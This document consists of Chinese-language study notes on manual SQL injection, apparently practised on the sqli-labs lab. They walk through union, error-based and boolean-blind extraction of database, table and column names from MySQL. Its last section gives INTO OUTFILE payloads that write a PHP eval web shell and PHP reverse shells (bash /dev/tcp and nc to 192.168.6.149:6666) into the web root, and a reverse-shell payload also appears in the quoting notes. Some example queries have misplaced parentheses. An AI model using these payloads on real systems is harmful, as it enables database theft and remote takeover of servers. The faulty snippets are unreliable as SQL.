## 注意事项

```sql
-- 引号问题
-- 1、单引号的解析问题
SELECT * FROM users WHERE id='1' and 1=2 '' LIMIT 0,1 -- 错误
/*这两个连续的''在此是不合法的，它无法被解析，正确的命令应该是再加一个and，他就可以被解析*/
SELECT * FROM users WHERE id='1' and 1=2 and '' LIMIT 0,1 --正确


-- 2、sql中字符串必须用''框起来


-- 3、单双引号的闭合问题
-- 错误写法，这里exec中的第一个单引号就把<?php前的单引号给闭合了。
-- 而且exec的第一个单引号会把-c后边（bash前边）的单引号闭合。
select * from users where id=1 union select 1,'<?php exec('/bin/bash -c 'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1'') ?>',3 into outfile '/var/www/html/1.php';

-- 正确写法
select * from users where id=1 union select 1,'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1\'") ?>',3 into outfile '/var/www/html/1.php';
```

```sql
/*--作为注释符时，后边需要加任意空格和一个任意字符才可以作注释，而浏览器往往在传参的时候会忽略这个空格，因此--作为注释符被sql解析*/
-- 这是正确的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 -- q
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --+
-- 这是错误的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --q
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --_(_代表一个空格)
```

```sql
-- 联合查询问题
-- 1、联合查询返回的结果和原始结果的关系，以及如何和原始结构合并
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 联合查询在sql中的结果是返回原始查询和联合查询共同的结果集。

/*但是在浏览器中回显的时候一般要看后端脚本怎么将结果回显到浏览器上，一般都只会通过$row = mysql_fetch_array($result)函数返回结果集的第一个结果，即DUMB和DUMB，而不是DUMB2和DUMB3。*/

SELECT * FROM users WHERE id=1 union select 1,2,3 LIMIT 1,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 但是可以通过LIMIT a,b来限制结果集结果，其中a代表偏移量，b代表显示几行，最后将显示原先结果集中第a行以后的共b行结果。
-- 或者用group_concat()函数来使得结果集合并为一行，但是这样可能会因为浏览器的显示字符有限而使得显示不全
SELECT * FROM users WHERE id='' union select 1,group_concat(id),3 from users;
+----+-------------------------------+----------+
| id | username                      | password |
+----+-------------------------------+----------+
|  1 | 1,2,3,4,5,6,7,8,9,10,11,12,14 | 3        |
+----+-------------------------------+----------+
-- 2、联合查询和and的区别
-- uniont select前后是两个逻辑，他们之间没有与或非的关系
SELECT * FROM users WHERE id=1 and 1=2 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里id=1虽然存在但是由于和1=2进行了and，所以没有id=1的结果
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里没有用and因为有id=1的结果
```

```sql
-- 特殊问题
-- sql某些函数的参数不可以是子查询，但是可以通过括号先执行一个子查询，再将结果作为参数输入。虽然某些函数参数可以为子查询，但是最好的习惯就是全部将子查询的结果作为参数。
-- 错误示范(以length()函数举例)
select * from users where id='1' and length(select database()) = name-length;
-- 正确写法
select * from users where id='1' and length((select database()) = name-length;
```



## 手注思路

```sql
-- 1、判断是否有注入
-- 挨着尝试 无闭合，''闭合，""闭合，('')闭合，("")闭合，((''))闭合，((""))闭合；然后加上and 1=1和and 1=2看是否存在注入，如果第一个逻辑真返回为原始查询，第二个逻辑假返回另一个结果(不一定是报错，但是肯定和原始查询结果不一样）则证明存在该闭合注入，否则不好说（可能被过滤了and逻辑或者没有注入点或者存在时间盲注点）。


-- 2、选择注入方式
-- 联合注入（有显式回显的情况）
-- 报错注入（无显式回显的情况，前提是服务端没有正确处理sql报错，此注入方法比盲注简单，优先级大于盲注）
-- 布尔盲注（无显式回显的情况，但逻辑真和逻辑假有不同的回显）
-- 时间盲注（不仅无显式回显，连逻辑真和逻辑假都是相同的回显，即布尔盲注不可用）

-- 3、联合注入
-- 判断列数（row,也即字段数）
-- 判断列数是为了后边联合查询结果和原始查询结果列保持一致，否则会报错
-- 从1开始尝试，到报错为止即为列数（不报错证明存在第n列）
select * from users where id=1 order by 1;

-- 联合查询查看所有库
select * from users where id=1 union select 1,schema_name,3 from information_schema.schemata;
-- 联合查询查看当前库（联合查询担当了select关键字的任务，否则单纯的一个databaes()是不会返回当前库名的
select * from users where id=1 union select 1,database(),3;

-- 联合查询查看当前库中的所有表
select * from users where id=1 union select 1,table_name,3 from information_schema.tables where table_schema="某库名（或者为当前库名database()）";

-- 联合查询查看当前表中所有的列(注意同时过滤表名和库名，否则可能会有同名列)
select * from users where id=1 union select 1,column_name,3 from information_schema.columns where table_schema="schema-name" and table_name="table-name";

-- 其实拿到表名后就可以配合LIMIT查看该表所有数据了
-- 或者拿到列名后之查看部分数据
select * from users where id=1 union select 1,row1-name,row2-name from table-name;


--将数据写入文件
select 1,2,3 into outfile "/path/to/write"; 

-- 4、报错注入
-- 爆当前库名
select * from users where id='1' and updatexml(1, concat(0x7e, (select database()), 0x7e), 3);
select * from users where id='1' and updatexml(1, concat('!', (select database()), '!'), 3);
-- 接下来替换select database()进行类似联合注入的手注即可
-- 注意的是报错一般有浏览器回显的长度限制

-- 5、布尔盲注
```







## 无显式回显说明

```sql
-- 什么是无显式回显
select * from users where id=1；
-- 返回的sql查询结果是
|  1 | Dumb     | Dumb     |
-- 但是这三个任何一个列的结果都不会显示在浏览器上（即可能后端拿着这个数据干了别的事，只返回了成功或失败），这就是无显式的回显。
```





## 报错注入详解

报错注入：无显式回显的不代表有报错注入，输入了错误的内容（比如and 1=2）导致了报错也不代表会有报错注入，得用updatexml()尝试才知道有没有报错注入。

```sql
-- 原始查询
select * from users where id='1'；
-- 使用updatexml报错查询，它和联合查询不同，不需要关心字段数等，一般搭配AND和OR使用
-- ###特别注意的是，mysql机制中，如果and前的条件不成立，则压根不会执行and后边的条件；同样的，如果OR前面的成立了，则也压根不会执行OR后边的条件。
-- ###还有一点要注意，concat中间是要加括号的，而且要加完整的命令
select * from users where id='1' and updatexml(1, concat(0x7e, (select database()), 0x7e), 3);
select * from users where id='1' and updatexml(1, concat('~', (select database()), '~'), 3);
-- 但是报错一般有长度限制
```

## 布尔盲注详解

```sql
-- 猜名字长度length()
select * from users where id='1' and length(database()) = name-length;
-- length的参数只能是字符串或数值，不能是子查询,但是可以用括号先得到子查询的结果在给length()
select * from users where id='1' and length((select database())) = name-length;

-- 猜名字之取子串substr()
-- 取database()的从a开始长度为b的子串
select * from users where id='1' and substr((select database(), a, b)) = "sub-str";
-- 取ascii()
select * from users where id='1' and ascii("a") = 97;
-- 合起来就是
select * from users where id='1' and ascii(substr((select database(), a, b)) = 97

-- 对于个返回row的情况，可以使用limit限制输出来挨个获得结果

-- 这里比较特殊的是取表名长(需要用limit限制输出)
select * from users where id='1' and length((select table_name from information_schema.tables where table_schema="security" limit 0, 1)) = 8;
```



## 写马

```sql
-- 1、into outfile
-- webshell
select * from users where id=1 union select 1,'<?php eval($_REQUEST[cmd]) ?>',3 into outfile '/var/www/html/php_name.php';
-- 反弹shell
select * from users where id=1 union select 1,'<?php exec(\'bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1" \') ?>',3 into outfile '/var/www/html/php_name.php';
select * from users where id=1 union select 1,'<?php exec("nc 192.168.6.149 6666") ?>',3 into outfile '/var/www/html/php_name.php';
```

